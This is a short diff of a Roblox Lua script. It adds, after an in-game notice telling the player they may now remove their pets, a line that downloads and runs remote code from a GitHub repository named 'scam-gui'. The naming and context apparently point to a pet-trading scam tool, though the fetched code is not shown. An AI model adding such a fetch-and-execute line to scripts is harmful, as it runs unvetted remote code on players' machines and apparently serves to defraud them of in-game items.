@@ -30,5 +30,6 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
                 Text = "Now you may remove your pets.";
                 Duration = 1.5;})
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dogefriendyt/scam-gui/main/scam/sillybillygui', true))()
 
 end)
